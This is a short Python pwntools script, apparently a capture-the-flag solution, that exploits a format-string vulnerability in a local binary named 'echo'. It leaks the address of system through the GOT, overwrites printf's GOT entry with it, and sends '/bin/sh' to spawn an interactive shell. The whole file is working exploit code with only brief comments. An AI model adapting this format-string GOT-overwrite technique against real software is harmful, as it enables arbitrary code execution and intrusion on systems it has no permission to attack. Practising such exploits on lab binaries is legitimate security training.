#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

elf = ELF("./echo")
printf_got = elf.got["printf"]
system_got = elf.got["system"]

io = process("./echo")
#leak system_addr
payload = p32(system_got) + "%7$s"
io.sendline(payload)
system_addr = u32(io.recv(8)[4: 8])

#hijack system to printf_got
payload = fmtstr_payload(7, {printf_got: system_addr})
io.sendline(payload)

#system("/bin/sh")
io.sendline("/bin/sh")

io.interactive()
io.close()

